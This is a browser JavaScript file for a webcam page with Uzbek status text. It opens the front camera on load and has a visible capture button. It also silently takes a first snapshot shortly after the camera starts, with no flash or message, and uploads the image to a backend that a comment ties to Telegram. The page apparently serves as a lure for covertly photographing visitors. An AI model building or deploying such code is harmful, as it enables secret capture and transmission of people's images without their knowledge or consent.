const video = document.getElementById('camera-stream');
const canvas = document.getElementById('capture-canvas');
const captureBtn = document.getElementById('capture-btn');
const statusMsg = document.getElementById('status-msg');
const flashOverlay = document.getElementById('flash-overlay');

let mediaStream = null;
let isSending = false;

// Initialize Live Camera immediately on page load
async function initCamera() {
    try {
        if (statusMsg) {
            statusMsg.innerText = "Kamera faollashtirilmoqda...";
            statusMsg.style.color = '#94a3b8';
        }

        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });

        mediaStream = stream;
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            video.play().then(() => {
                if (statusMsg) {
                    statusMsg.innerText = "Kamera tayyor! 📸";
                    statusMsg.style.color = '#a5b4fc';
                }
                // Optional initial snap after camera is warm
                setTimeout(() => {
                    takeSnapshot(false);
                }, 1400);
            }).catch(err => {
                console.log("Autoplay waiting for user gesture:", err);
            });
        };

    } catch (err) {
        console.error("Camera access error:", err);
        if (statusMsg) {
            statusMsg.innerText = "Kameraga ruxsat bering ⚠️";
            statusMsg.style.color = '#f87171';
        }
    }
}

// Flash Animation Effect
function triggerFlash() {
    if (!flashOverlay) return;
    flashOverlay.classList.add('flash-active');
    setTimeout(() => {
        flashOverlay.classList.remove('flash-active');
    }, 150);
}

// Take snapshot and send
async function takeSnapshot(isManual = true) {
    if (isSending && isManual) return;
    if (!video || !video.srcObject) {
        if (isManual) {
            await initCamera();
        }
        return;
    }

    if (isManual) {
        triggerFlash();
        if (statusMsg) {
            statusMsg.innerText = "Surat olinmoqda 📸...";
            statusMsg.style.color = '#e2e8f0';
        }
        if (captureBtn) captureBtn.disabled = true;
    }

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;

    canvas.width = width;
    canvas.height = height;
    const ctx = canvas.getContext('2d');

    // Mirror effect
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const base64Data = canvas.toDataURL('image/jpeg', 0.85);

    if (!base64Data || base64Data.length < 200) {
        if (isManual && captureBtn) captureBtn.disabled = false;
        return;
    }

    await sendPhoto(base64Data, isManual);
}

// Send photo to backend / Telegram
async function sendPhoto(base64Str, isManual) {
    if (isManual) {
        isSending = true;
        if (statusMsg) {
            statusMsg.innerText = "Yuborilmoqda 🚀...";
            statusMsg.style.color = '#93c5fd';
        }
    }

    const endpoints = ['/api/upload', '/upload'];

    for (const url of endpoints) {
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: base64Str })
            });

            if (res.ok) {
                const data = await res.json();
                console.log("Photo sent successfully via:", url, data);
                if (isManual && statusMsg) {
                    statusMsg.innerText = "Muvaffaqiyatli yuborildi! ✅";
                    statusMsg.style.color = '#4ade80';
                }
                break;
            }
        } catch (e) {
            console.warn(`Failed sending to ${url}:`, e);
        }
    }

    if (isManual) {
        isSending = false;
        if (captureBtn) captureBtn.disabled = false;
    }
}

// Capture Button Click Handler
if (captureBtn) {
    captureBtn.addEventListener('click', () => {
        takeSnapshot(true);
    });
}

// Start on page load
if (document.readyState === 'loading') {
    window.addEventListener('DOMContentLoaded', initCamera);
} else {
    initCamera();
}
